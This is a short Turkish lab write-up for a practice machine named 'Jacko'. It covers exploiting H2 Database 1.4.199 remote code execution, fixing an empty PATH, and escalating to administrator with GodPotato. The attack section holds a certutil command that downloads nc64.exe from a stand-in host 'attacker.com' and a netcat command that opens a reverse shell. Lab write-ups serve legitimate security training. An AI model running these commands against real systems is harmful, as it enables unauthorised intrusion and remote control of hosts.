---
layout: page
title: Jacko - H2 Database RCE
permalink: /jacko/
---

# Jacko - H2 Database RCE

## 📌 Senaryo
Jacko makinesi, H2 Database Server kullanıyor. Hedef versiyon olarak **H2 1.4.199** tespit edildi ve Exploit-DB'de bulunan zafiyetten faydalanıldı: https://www.exploit-db.com/exploits/49384

## 🔍 Keşif Aşaması

- Hedefte H2 veritabanı servisi çalışıyor.
- Versiyon: `H2 1.4.199`
- Bu sürümde bilinen RCE zafiyeti bulundu.

## ⚔️ Saldırı Aşaması

**Zafiyet kullanımı:**
- H2 RCE exploit'i kullanılarak hedefe kod enjekte edildi.
- `certutil` ile `nc64.exe` dosyası hedefe yüklendi.

**Dosya yükleme örneği:**
```cmd
certutil -urlcache -split -f http://attacker.com/nc64.exe C:\Windows\Temp\nc64.exe
```

**Reverse shell başlatma:**
```cmd
C:\Windows\Temp\nc64.exe 192.168.49.XX 4444 -e cmd.exe
```

## 🧠 PATH Sorunu

- Hedefte `cmd` üzerinde `echo %PATH%` çalıştırıldığında boş çıktı alındı.
- Bu yüzden `powershell.exe` başlangıçta çalışmıyordu.
- Sorunu çözmek için PATH'e `C:\Windows\system32` ve PowerShell yolu eklendi.

```cmd
set PATH=%PATH%;C:\Windows\system32;C:\Windows\system32\WindowsPowerShell\v1.0\
```

- Sonrasında `powershell.exe` çalıştırılabildi.

## 🔐 GodPotato ve SeImpersonatePrivilege

- PATH sorunundan dolayı diğer yöntemler yeni terminal session açtığında aynı hatayla karşılaşıyordu.
- `GodPotato`, mevcut terminal session üzerinden devam ettiği için bu durumda daha uygun oldu.
- Yani SeImpersonatePrivilege olsa da, mevcut oturumda ilerleyebilmek için `GodPotato` tercih edildi.

## 🛡️ Sonuç

- H2 1.4.199 RCE kullanıldı.
- `certutil` ile `nc64.exe` yüklendi.
- Shell alındı.
- PATH sorunu çözüldü.
- `GodPotato` mevcut terminal üzerinden root/ADMIN yetkisine devam etti.
